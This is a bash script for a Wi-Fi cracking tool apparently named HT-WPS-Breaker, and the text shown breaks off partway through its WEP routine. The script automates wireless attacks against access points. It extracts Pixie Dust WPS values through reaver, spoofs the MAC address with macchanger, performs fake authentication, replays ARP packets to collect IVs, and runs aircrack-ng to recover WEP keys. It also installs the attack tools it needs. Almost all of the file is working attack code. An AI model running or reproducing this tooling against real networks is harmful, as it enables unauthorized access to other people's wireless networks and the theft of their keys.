#!/bin/bash

# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

Temporary="/tmp/HT-WPS-Breaker"

####################################################
########Verify the folder of Temporary files########
####################################################
   Ver_Dir=`ls /tmp | grep -E '^HT-WPS-Breaker$'`
   if [ "$Ver_Dir" != "" ];then
	    rm -rf ${Temporary}
	    mkdir ${Temporary}
   else
	    mkdir ${Temporary}
   fi
####################################################
#--------------------------------------------------#
####################################################
##############Verify Desktop Folder ################
####################################################
      if [ $(ls ~ | grep Desktop) != "" ] 
	      then
	          Desktop_PATH=~/Desktop
      elif [ $(ls ~ | grep Bureau) != "" ]
	      then
	          Desktop_PATH=~/Bureau
      else
	          Desktop_PATH=~
      fi
####################################################


exit_function() {
echo ""
echo ""
echo ""
echo -e "$Red [!]$White Remove any temporary file."
rm -rf ${Temporary}
sleep 1
echo ""
if [ "$mode_monitor" == "active" ]
    then
        echo -e "$White [${Red}!${White}]$BRed Stop$White the ${Green}Monitor Mode$White."
        airmon-ng stop $mon > /dev/null
        echo ""
fi
echo -e "$White [+]$Green Greetz to : ${Cyan}AKAS${White} ."
echo ""
exit
}
kill_wep_function() {
	                WEP_KILL=1
					Quit=1
					IVs=20000
					echo ""
	                echo -e "          ${Yellow}>>${White} The Cracking process has${Red} stoped${White} , G00D LuCk Next Time ."
	                echo -e "          ${Yellow}>>${White} Kill all processes running in${Red} background${White} ."
					echo ""
					echo -e "$White          [${Red}!${White}]$White Sorry password not found , good luck next time."
	                kill -9 $Airodump_PID 2> /dev/null
					kill -9 $arpreplay_PID 2> /dev/null
					kill -9 $aircrack_PID 2> /dev/null
					tset
					exit_function
}
kill_reaver() {
	                kill -9 $ReaverID 2> /dev/null
	                Quit=1
}
kill_wash() {
                    kill -9 $WashID 2> /dev/null
					Quit=1
}
kill_load() {
	                PID=$(($PID-1))
	                kill -9 $PID 2> /dev/null
}
kill_Hidden() {
	                Quit=1
	                echo ""
	                echo ""
	                echo -e "          ${Yellow}>>${White} The Cracking process has${Red} stoped${White} , G00D LuCk Next Time ."
	                echo -e "          ${Yellow}>>${White} Kill all processes running in${Red} background${White} ."
					echo ""
					echo -e "$White          [${Red}!${White}]$White Sorry Name not found , good luck next time ."
	                kill -9 $aireplayID 2> /dev/null
					kill -9 $Airodump_PID 2> /dev/null
					exit_function
}
arguments() {
						   echo "" > ${Temporary}/empty.txt
                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -e "$ESSID" -vvv -n -L -P -s ${Temporary}/empty.txt > ${Temporary}/Reaver.txt &
						   ReaverID=$!
						   disown $ReaverID
   						   e=`cat ${Temporary}/Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p`
                           r=`cat ${Temporary}/Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
                           s=`cat ${Temporary}/Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p`
                           z=`cat ${Temporary}/Reaver.txt | grep E-Hash2: | cut -d' ' -f3 | sed -n 1p`
                           a=`cat ${Temporary}/Reaver.txt | grep AuthKey: | cut -d' ' -f3 | sed -n 1p`
                           n=`cat ${Temporary}/Reaver.txt | grep E-Nonce: | cut -d' ' -f3 | sed -n 1p`
                           m=`cat ${Temporary}/Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p`
                           WPS=`cat ${Temporary}/Reaver.txt | grep 'WPS PIN'`
						   echo ""
						   echo -e "${White} +${Yellow}------------------------------${White}+"
						   echo -e "${Yellow} |${White} [${Red}+${White}]$Yellow all required arguments${Yellow}   |"
						   echo -e "${White} +${Yellow}------------------------------${White}+"
						   echo ""
						   v=0
						   Quit=0
						   while [ $v == 0 ] && [ $Quit == 0 ] #Reaver
						   do
						   n=`cat ${Temporary}/Reaver.txt | grep 'Trying pin'`
						   p=`cat ${Temporary}/Reaver.txt | wc -l`
						             if [ "$n" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
										       t=`cat ${Temporary}/Reaver.txt | sed -n $p'p' | cut -c 4-`
                           		               echo -ne "$White [+]$Green$t"
											   v=1
										   else
										       t=`cat ${Temporary}/Reaver.txt | sed -n $p'p' | cut -c 4-`
											   echo -ne "\r$White [+]$Red $t"
											   v=0
									 fi
						   done
						   BTN () {
						   	        if [ $Quit == 0 ]
						   	  	        then
						   	      	        echo ""
						   	      	        sleep 0.2
						   	     	        v=0
						   	        fi
						   }
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #E-Nonce
						   do
						   n=`cat ${Temporary}/Reaver.txt | grep E-Nonce: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$n" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] E-Nonce: ${Green}$n"
											   v=1
										   else
											   echo -ne "\r$White [+] E-Nonce:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #PKE
						   do
						   e=`cat ${Temporary}/Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p` 
						             if [ "$e" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] PKE: ${Green}$e"
											   v=1
										   else
											   echo -ne "\r$White [+] PKE:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #R-Nonce
						   do
						   m=`cat ${Temporary}/Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$m" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] R-Nonce: ${Green}$m"
											   v=1
										   else
											   echo -ne "\r$White [+] R-Nonce:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #PKR
						   do
						   r=`cat ${Temporary}/Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$r" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] PKR: ${Green}$r"
											   v=1
										   else
											   echo -ne "\r$White [+] PKR:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #AuthKey
						   do
						   a=`cat ${Temporary}/Reaver.txt | grep AuthKey: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$a" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] AuthKey: ${Green}$a"
											   v=1
										   else
											   echo -ne "\r$White [+] AuthKey:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #E-Hash1
						   do
						   s=`cat ${Temporary}/Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$s" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] E-Hash1: ${Green}$s"
											   v=1
										   else
											   echo -ne "\r$White [+] E-Hash1:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   BTN
						   while [ $v == 0 ] && [ $Quit == 0 ] #E-Hash2
						   do
						   z=`cat ${Temporary}/Reaver.txt | grep E-Hash2: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$z" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] E-Hash2: ${Green}$z"
											   v=1
										   else
											   echo -ne "\r$White [+] E-Hash2:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   sleep 0.2
						   echo ""
						   echo ""
						   echo -e "${White} +${Yellow}-------------------------------------------${White}+"
						   echo -e "${Yellow} |${White} [${Red}+${White}]${Yellow} Information about Access Point (AP)   |"
						   echo -e "${White} +${Yellow}-------------------------------------------${White}+"
						   echo ""
						   echo -e "$White [+] ESSID: $Green$ESSID"
				           sleep 0.2
                           echo -e "$White [+] BSSID: $Green$BSSID "
						   sleep 0.2
                           echo -e "$White [+] Channel: $Green$CHANNEL "
						   sleep 0.2
						   if [ "$menu" -ne 1 ]
						      then
						          echo -e "$White [+] Encryption:$Green $PRIVACY"
						          sleep 0.2
						          echo -e "$White [+] Speed:$Green$SPEED"
						   fi
						   Manufacturer=`cat ${Temporary}/Reaver.txt | grep Manufacturer: | cut -d' ' -f2- | sed  -n 1p`
						   Model_Name=`cat ${Temporary}/Reaver.txt | grep Name: | cut -d' ' -f2- | sed -n 1p`
						   Model_Number=`cat ${Temporary}/Reaver.txt | grep 'Model Number:' | cut -d' ' -f2- | sed -n 1p`
						   Serial_Number=`cat ${Temporary}/Reaver.txt | grep 'Serial Number:' | cut -d' ' -f2- | sed -n 1p`
						   echo -e "$White [+] $Manufacturer"
						   sleep 0.2
						   echo -e "$White [+] $Model_Name"
						   sleep 0.2
						   echo -e "$White [+] $Model_Number"
						   sleep 0.2
						   echo -e "$White [+] $Serial_Number"
						   sleep 0.2
                           echo ""
						   sleep 0.2
						   kill -9 $ReaverID 2> /dev/null
}
Ver_Mon_WCar_Fun() {
                 echo ""
				 echo "[+] Scanning for wireless devices ..."
                 if [ $VerCar -ge 1 ] && [ "$VerMon" = "" ]
                      then
                           Ver_aircrack_ng=`aircrack-ng | grep -E -w "1.2 rc(2|3)"`
                           Num_Line=`iwconfig 2>&1 | grep 'ESSID' | wc -l `
						   echo -e "[+] We found$Green $Num_Line$White wireless device(s)."
						   echo ""
						   echo -e $Yellow" +${White}----${Yellow}+${White}--------------------------------------${Yellow}+"
						   echo -e " ${White}| ${Yellow}ID${White} |   ${BRed}Interface     ${Yellow}|$Cyan     Chipset        ${White}|"
						   echo -e " ${Yellow}+${White}----${Yellow}+${White}--------------------------------------${Yellow}+"
						   for (( c=1; c<=$Num_Line; c++))
       						    do
								  m[$c]=`iwconfig 2>&1 | grep 'ESSID' | awk '{print $1}' | sed -n ${c}'p'`
	     						  if [ "$Ver_aircrack_ng" != "" ]
                           	         then
                           	             Interface=`cat ${Temporary}/.airmon-ng.txt | grep ${m[$c]} | cut -f2`
                           	             Chipset=`cat ${Temporary}/.airmon-ng.txt | grep ${m[$c]} | rev | cut -f1 | rev`
                           	             if [ "$Num_Line" -lt "10" ]
                           	             	then
                           	                    echo -e "  ${Red}[${Yellow}0$c${Red}]$White   $Interface           $Chipset"
                           	             else
                           	             	    echo -e "  ${Red}[${Green}$c${Red}]$White   $Interface           $Chipset"
                           	             fi
                           	         else
                           	         	 airmon-zc 2> /dev/null > /dev/null
                           	         	 AIR_ZC="echo $?"
                           	         	 if [ "$AIR_ZC" == 0 ]
                           	         	 	then
                           	         	        airmon-zc > ${Temporary}/.airmon-zc.txt
	     						                Interface=`cat ${Temporary}/.airmon-zc.txt | grep ${m[$c]} | cut -f2`
                           	                    Chipset=`cat ${Temporary}/.airmon-zc.txt | grep ${m[$c]} | rev | cut -f1 | rev`
                           	                    if [ "$Num_Line" -lt "10" ]
                           	             	       then
                           	                           echo -e "  ${Red}[${Yellow}0$c${Red}]$White   $Interface           $Chipset"
                           	                    else
                           	             	           echo -e "  ${Red}[${Green}$c${Red}]$White   $Interface           $Chipset"
                           	                    fi
                           	                else
                           	                	Interface=`cat ${Temporary}/.airmon-ng.txt | grep ${m[$c]} | cut -f1`
                           	                    Chipset=`cat ${Temporary}/.airmon-ng.txt | grep ${m[$c]} | cut -f2-3`
                           	                    if [ "$Num_Line" -lt "10" ]
                           	             	       then
                           	                           echo -e "  ${Red}[${Yellow}0$c${Red}]$White   $Interface           $Chipset"
                           	                       else
                           	             	           echo -e "  ${Red}[${Green}$c${Red}]$White   $Interface           $Chipset"
                           	                    fi
                           	             fi

	     						  fi
						   done
						   echo ""
						   echo ""
						   V_number=0
						   while [ "$V_number" != "1" ]
								 do
								   echo -en "\033[1A\033[2K"
						           echo -e -n "${White}[+] Select$BRed number$White of wireless device to put into$Green monitor mode$White [${Green}1-$Num_Line$White]:$Green"
						           read number
								   if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
									  then
								          if [ $number -ge 1 ] && [ $number -le $Num_Line ]; then
									          V_number=1
											  wlan=${m[$number]}
						   		          else
									          V_number=0
										  fi
								   else
								              V_number=0
								   fi
						   done
						   Wait_Msg="Enabling monitor mode on$Green $wlan $White."
						   End_Msg="${Green}Mode Monitor$White is enabled ."
						   trap kill_load SIGINT
						   ifconfig $wlan down && iwconfig $wlan mode monitor && ifconfig $wlan up > /dev/null 2> /dev/null &
						   PID="$!"
						   Loading
						   trap - SIGINT SIGQUIT SIGTSTP
                           mode_monitor="active"
                 elif [ "$VerCar" -le 0 ] && [ "$menu" -eq 6 ]
				        then
						    echo "" 
                            sleep 0.5
                            echo -e $White" [${Red}!${White}] Is no wireless device to put into${Green} monitor mode${White} ."
                            echo ""
                            sleep 0.5
                 elif [ $VerCar -le 0 ] && [ "$VerMon" = "" ]
                        then   
						    echo "" 
                            sleep 0.5
                            echo -e $White"     [${Red}!${White}] Wireless Card${Red} Not Found${White} ."
                            sleep 0.5
                 fi
				 airmon-ng > ${Temporary}/.airmon-ng.txt
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
}
Ver_Mon_Fun() {
                           cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
						   if [ $cou_mon -eq 1 ]
						        then
								    mon=`iwconfig 2>&1 | grep Mode:Monitor | awk '{print $1}'`
									Num_Mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
						   elif [ $cou_mon -gt 1 ]
						        then
								    Ver_aircrack_ng=`aircrack-ng | grep -E -w "1.2 rc(2|3)"`
						            Num_Mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
								    echo -e "[+] We found$Green $cou_mon$White monitor mode."
									echo ""
						            echo -e $Yellow" +${White}----${Yellow}+${White}--------------------------------------${Yellow}+"
						            echo -e " ${White}| ${Yellow}ID${White} |   ${BRed}Interface     ${Yellow}|$Cyan     Chipset        ${White}|"
						            echo -e " ${Yellow}+${White}----${Yellow}+${White}--------------------------------------${Yellow}+"
						            for (( c=1; c<=$Num_Mon; c++))
       						            do
										    m[$c]=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}' | sed -n ${c}'p'`
										    if [ "$Ver_aircrack_ng" != "" ]
                           	                   then
                           	                       Interface=`cat ${Temporary}/.airmon-ng.txt | grep ${m[$c]} | cut -f2`
                           	                       Chipset=`cat ${Temporary}/.airmon-ng.txt | grep ${m[$c]} | rev | cut -f1 | rev`
                           	                       if [ "$cou_mon" -lt "10" ]
                           	             	          then
                           	                              echo -e "  ${Red}[${Yellow}0$c${Red}]$White   $Interface           $Chipset"
                           	                       else
                           	             	           echo -e "  ${Red}[${Green}$c${Red}]$White   $Interface           $Chipset"
                           	                       fi
                           	                else
                           	                       airmon-zc 2> /dev/null > /dev/null
                           	         	           AIR_ZC="echo $?"
                           	         	           if [ "AIR_ZC" == 0 ]
                           	         	 	          then
                           	         	                  airmon-zc > ${Temporary}/.airmon-zc.txt
	     						                          Interface=`cat ${Temporary}/.airmon-zc.txt | grep ${m[$c]} | cut -f2`
                           	                              Chipset=`cat ${Temporary}/.airmon-zc.txt | grep ${m[$c]} | rev | cut -f1 | rev`
                           	                              if [ "$cou_mon" -lt "10" ]
                           	             	                 then
                           	                                     echo -e "  ${Red}[${Yellow}0$c${Red}]$White   $Interface           $Chipset"
                           	                              else
                           	             	                     echo -e "  ${Red}[${Green}$c${Red}]$White   $Interface           $Chipset"
                           	                              fi
                           	                          else
                           	                	          Interface=`cat ${Temporary}/.airmon-ng.txt | grep ${m[$c]} | cut -f1`
                           	                              Chipset=`cat ${Temporary}/.airmon-ng.txt | grep ${m[$c]} | cut -f1-3`
                           	                              if [ "$cou_mon" -lt "10" ]
                           	             	                 then
                           	                                     echo -e "  ${Red}[${Yellow}0$c${Red}]$White   $Interface           $Chipset"
                           	                                 else
                           	             	                     echo -e "  ${Red}[${Green}$c${Red}]$White   $Interface           $Chipset"
                           	                              fi
                           	                       fi
	     						            fi
						            done
									echo ""
									echo ""
									V_number=0
									while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -e -n "\r${White}[+] select$Red number$White of interface to use for capturing [${Green}1-$Num_Mon$White]:$Green"
						                      read number
											  if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
									             then
											         if [ $number -ge 1 ] && [ $number -le $Num_Mon ]; then
											             V_number=1
														 mon=${m[$number]}
											         else
											             V_number=0
											         fi
											  else
											             V_number=0
											  fi
								    done
						   fi
						   rm -rf ${Temporary}/.airmon-ng.txt
}
Loading() {
                disown $PID
                Finish=0
                count=0
				echo ""
				echo -en "\033[1A\033[2K"
                while [ "$Finish" == 0 ]
                do
                  Ver_Ins=`ps -A | grep -w $PID`
                  if [ "$Ver_Ins" == "" ]
  	                 then
  	                     echo ""
  	                     echo -en "\033[1A\033[2K"
  	                     echo -ne "$White[${Green} ok ${White}] $End_Msg"
  	                     Finish=1
                  else
  	                     if [ "$count" -eq 1 ]
  	     	                then
  	                            echo -ne "\r$White[${Red}*   ${White}] $Wait_Msg"
  	                     elif [ "$count" -eq 2 ]
  	     	                then
  	     	                    echo -ne "\r$White[${Red} *  ${White}] $Wait_Msg"
  	                     elif [ "$count" -eq 3 ]
  	     	                then
  	     	                    echo -ne "\r$White[${Red}  * ${White}] $Wait_Msg"
  	                     else
  	     	                    echo -ne "\r$White[${Red}   *${White}] $Wait_Msg"
  	     	                    count=0
  	                     fi
                         Finish=0
                         count=$(($count+1))
                         sleep 0.2
                  fi
                done
                echo ""
}
Installation() {
                echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				sleep 2
                dpkg -i $NOPI > /dev/null &
                PID="$!"
                disown $PID
                Finish=0
                count=0
				echo ""
				echo -en "\033[1A\033[2K"
                while [ "$Finish" == 0 ]
                do
                  Ver_Ins=`ps -A | grep -w $PID`
                  if [ "$Ver_Ins" == "" ]
  	                 then
  	                     echo ""
  	                     echo -en "\033[1A\033[2K"
  	                     echo -ne "$White [${Green} ok ${White}] Installation of$Green $NOP$White is done ."
  	                     Finish=1
                  else
  	                     if [ "$count" -eq 1 ]
  	     	                then
  	                            echo -ne "\r$White [${Red}*   ${White}] Please wait until the$Green $NOP$White is installed ."
  	                     elif [ "$count" -eq 2 ]
  	     	                then
  	     	                    echo -ne "\r$White [${Red} *  ${White}] Please wait until the$Green $NOP$White is installed ."
  	                     elif [ "$count" -eq 3 ]
  	     	                then
  	     	                    echo -ne "\r$White [${Red}  * ${White}] Please wait until the$Green $NOP$White is installed ."
  	                     else
  	     	                    echo -ne "\r$White [${Red}   *${White}] Please wait until the$Green $NOP$White is installed ."
  	     	                    count=0
  	                     fi
                         Finish=0
                         count=$(($count+1))
                         sleep 0.2
                  fi
                done
                echo ""
}
Ver_Pckg_Tools() {
	             reaver 2&> ${Temporary}/Ver_Reaver.txt
                 hash pixiewps 2> /dev/null
                 Ver_Pixiewps="$?"
				 airmon-ng > ${Temporary}/.airmon-ng.txt
				 Ver_Reaver=`cat ${Temporary}/Ver_Reaver.txt | grep 'mod by t6_x'`
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
                 Tools_Folder=`ls -l | grep -E 'Tools$' | grep -E '^d'`
				 Uname=`uname -m`
				 Exit=0
				 rm -rf  ${Temporary}/Ver_Reaver.txt
				 echo ""
				 hash dpkg 2> /dev/null
				 hash_dpkg="$?"
				 if [ $hash_dpkg -eq 0 ]
				      then
				          Ver_libssl_dev=`dpkg -l | grep -w "libssl-dev"`
						  if [ "$Ver_libssl_dev" = "" ] && [ "$Tools_Folder" != "" ]
				               then
				                    if [ "$Ver_Pixiewps" -ge "1" ] || [ "$Ver_Reaver" = "" ]
				                    	then
										    NOP="Libssl-dev"
						                    if [ $Uname == 'i686' ]
		                   	                     then
												     NOPI="libssl-dev_1.0.1k-3+deb8u1_i386.deb"
								                     cd Tools/32bits
						                             Installation
						                             cd ../..
								                 else
												     NOPI="libssl-dev_1.0.1k-3+deb8u1_amd64.deb"
								                     cd Tools/64bits
									                 Installation
									                 cd ../..
				                            fi
				                    fi
				          elif [ "$Ver_libssl_dev" = "" ]
				          	  then
				          	      if [ "$Ver_Pixiewps" -ge "1" ] || [ "$Ver_Reaver" = "" ]
				                    	then
				          	                NOP="Libssl-dev"
				          	                echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				          	                Exit=1
				          	                sleep 1
				          	      fi
				          fi
				          if [ "$Ver_Pixiewps" -ge "1" ] && [ "$Tools_Folder" != "" ]
				               then
					                NOP="Pixiewps"
						            if [ $Uname == 'i686' ]
		                   	           then
								           NOPI="pixiewps_1.1-1kali1_i386.deb"
								           cd Tools/32bits
						                   Installation
						                   cd ../..
						            else
								           NOPI="pixiewps_1.1-1kali1_amd64.deb"
								           cd Tools/64bits
								           Installation
								           cd ../..
				                    fi
				          elif [ "$Ver_Pixiewps" -ge "1" ]
				               then
				                   NOP="Pixiewps"
				                   echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				                   Exit=1
				          	       sleep 1
				          fi
				          if [ "$Ver_Reaver" = "" ] && [ "$Tools_Folder" != "" ]
				               then
					                NOP="Reaver"
						            if [ $Uname == 'i686' ]
		                   	           then
								           NOPI="reaver_1.5.2.1-1kali1_i386.deb"
								           cd Tools/32bits
						                   Installation
						                   cd ../..
						            else
								           NOPI="reaver_1.5.2.1-1kali1_amd64.deb"
								           cd Tools/64bits
								           Installation
								           cd ../..
				                    fi
				          elif [ "$Ver_Reaver" = "" ]
				               then
				                   NOP="Reaver"
				                   echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				                   Exit=1
				          	       sleep 1
				          fi
				 else
				 	      if [ "$Ver_Pixiewps" -ge "1" ] && [ "$Tools_Folder" != "" ]
				               then
						           Wait_Msg="Wait until the${Green} Pixiewps${white} is${Red} installed${White} ."
						           End_Msg="Installation of$Green Pixiewps$White is done ."
						           cd Tools
					               unzip pixiewps-master.zip > /dev/null 2> /dev/null &
					               PID="$!"
					               disown $PID
					               sleep 2.0
						           cd pixiewps-master/src
						           make > /dev/null 2> /dev/null && make install > /dev/null 2> /dev/null &
						           PID="$!"
						           Loading
						           cd ../..
						           rm -rf pixiewps-master
						           cd ..
						  elif [ "$Ver_Pixiewps" -ge "1" ]
						  	   then
						  	       NOP="Pixiewps"
				                   echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				                   Exit=1
				          	       sleep 1
				          fi
				          if [ "$Ver_Reaver" = "" ] && [ "$Tools_Folder" != "" ]
				              then
						           Wait_Msg="Wait until the${Green} Reaver${white} is${Red} installed${White} ."
						           End_Msg="Installation of$Green Reaver$White is done ."
						           cd Tools
					               unzip reaver-wps-fork-t6x-master.zip > /dev/null 2> /dev/null &
					               PID="$!"
					               disown $PID
					               sleep 2.0
						           cd reaver-wps-fork-t6x-master/src
						           chmod +x configure
						           ./configure > /dev/null 2> /dev/null && make > /dev/null 2> /dev/null && make install > /dev/null 2> /dev/null &
						           PID="$!"
						           Loading
						           cd ../..
						           rm -rf reaver-wps-fork-t6x-master
						           cd ..
						  elif [ "$Ver_Reaver" = "" ]
						  	   then
						  	       NOP="Reaver"
				                   echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
				                   Exit=1
				          	       sleep 1
				          fi
				 fi
				 if [ $Exit -eq 1 ]
				 	then
				 	    exit_function
				 fi
}
WEP_function() {
	                                WEP_KILL=0
								    CAA=1
								    Quit=0
								    IVs=0
								    echo ""
								    echo -e "${White}  +${Yellow}------------------------------${White}+"
								    echo -e "${Yellow}  |${White} [${Red}+${White}]$Yellow all required arguments${Yellow}   |"
								    echo -e "${White}  +${Yellow}------------------------------${White}+"
								    echo ""
								    echo -e "${Yellow}          >>${White} Macchanger${White} :"
								    ifconfig $mon down 2> /dev/null
								    macchanger -r $mon 2> /dev/null > ${Temporary}/MAC.txt
								    ifconfig $mon up 2> /dev/null
								    Current_MAC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "Current MAC" | awk '{print $3}'`
								    Permanent_MAC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "Permanent MAC" | awk '{print $3}'`
								    Type_Of_WC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "Permanent MAC" | cut -d" " -f4-`
								    New_MAC=`cat ${Temporary}/MAC.txt 2> /dev/null | grep "New MAC" | awk '{print $3}'`
								    echo -e "${Purple}             >>${White} Current MAC${White}   : ${White}${Current_MAC} ${White}."
								    echo -e "${Purple}             >>${White} Permanent MAC${White} : ${Green}${Permanent_MAC} ${White}${Type_Of_WC} ."
								    echo -e "${Purple}             >>${White} New MAC${White}       : ${Yellow}${New_MAC} ${White}."
								    airodump-ng -c $CHANNEL --bssid $BSSID -w ${Temporary}/${BSSID} --output-format csv,cap $mon 2> /dev/null &
								    Airodump_PID="$!"
								    disown $Airodump_PID
								    tset
								    aireplay-ng -1 3 -a $BSSID -T 1 $mon | tee ${Temporary}/aireplay-ng_fakeauth.txt > /dev/null &
								    fakeauth_PID="$!"
								    disown $fakeauth_PID
								    while [ $Quit == 0 ]
								    do
								    	Ver_Aireplay_PID=`ps -A | grep ${fakeauth_PID}`
								    	CAA=`cat ${Temporary}/aireplay-ng_fakeauth.txt 2> /dev/null | grep -c "Sending Authentication Request"`
								    	if [ "$Ver_Aireplay_PID" == "" ]
								    		then
								    		    echo ""
										        echo -en "\033[1A\033[2K"
                           		                echo -ne "${Yellow}          >>${White} fake authentication${White} : ${Green}Success ${White}."
                           		                Quit=1
                           		        else
                           		        	    echo -ne "\r          ${Yellow}>>${White} fake authentication${White} : ${Green}${CAA} ${Red}Attempt${White}."
                           		        	    Quit=0
                           		        fi
								    done
								    echo ""
								    Current_Dir=`pwd`
								    cd "${Temporary}"
								    aireplay-ng -3 -b $BSSID $mon > ${Temporary}/aireplay-ng_arpreplay 2> /dev/null &
								    arpreplay_PID="$!"
								    disown $arpreplay_PID
								    cd "${Current_Dir}"
								    echo -e "${Yellow}          >>${Cyan} Captured${Green} IVs${White} { ${Red}After${White} 10000${Green} IVs${Red} the attack will start${White} } :${Green} 0${White} IVs ."
								    sleep 8.0
								    echo -en "\033[1A\033[2K"
								    while [ $IVs -lt 10000 ]
								    do
								    	IVs=`cat ${Temporary}/${BSSID}-01.csv 2> /dev/null | grep ${BSSID} | cut -d',' -f11 | sed -n '1'p | tr -d [:space:]`
								    	echo -ne "\r${Yellow}          >>${Cyan} Captured${Green} IVs${White} { ${Red}After${White} 10000${Green} IVs${Red} the attack will start${White} } :${Green} ${IVs}${White} IVs ."
								    	sleep 2
								    done
								    echo ""
								    echo -e "\r          ${Yellow}>>${Cyan} The Cracking process has${Green} started${Cyan} , Just wait${White} ."
								    aircrack-ng ${Temporary}/${BSSID}-01.cap | tee ${Temporary}/aircrack-ng_rslt.txt 2> /dev/null > /dev/null &
								    aircrack_PID="$!"
								    disown $aircrack_PID
								    count=0
								    while [ $WEP_KILL == 0 ]
						            do
						            	Ver_Aircrack_PID=`ps -A | grep ${aircrack_PID}`
						            	Wait_Msg="${Cyan}Captured${Green} ${IVs}${White} ."
						            	IVs=`cat ${Temporary}/${BSSID}-01.csv | grep ${BSSID} | cut -d',' -f11 | sed -n '1'p | tr -d [:space:]`
						                if [ "$Ver_Aircrack_PID" == "" ]
									        then
										        echo ""
										        echo -en "\033[1A\033[2K"
                           		                echo -ne "${Yellow}          >>${Cyan} The process of${Green} Airmon-ng${Cyan} has completed${Green} successfully${White}."
											    WEP_KILL=1
										    else
						                        if [ "$count" -eq 1 ]
  	     	                                       then
  	                                                   echo -ne "\r        ${Red}>   ${White} $Wait_Msg"
  	                                            elif [ "$count" -eq 2 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Red} >   $Wait_Msg"
  	                                            elif [ "$count" -eq 3 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Red}  >  $Wait_Msg"
  	                                            elif [ "$count" -eq 4 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Red}   > $Wait_Msg"
  	     	                                    elif [ "$count" -eq 5 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Yellow}>>>> $Wait_Msg"
  	     	                                    elif [ "$count" -eq 6 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Yellow}     $Wait_Msg"
  	     	                                    elif [ "$count" -eq 7 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Green}>>>> $Wait_Msg"
  	     	                                    elif [ "$count" -eq 8 ]
  	     	                                       then
  	     	                                           echo -ne "\r        ${Yellow}     $Wait_Msg"
  	     	                                           count=0
  	                                            fi
                                                count=$(($count+1))
											    WEP_KILL=0
											    sleep 0.2
									    fi
									done
									cr_date=`date`
						            Ver_Key=`cat ${Temporary}/aircrack-ng_rslt.txt 2> /dev/null | grep -i "KEY FOUND"`
						            if [ "$Ver_Key" != "" ]
						            	then
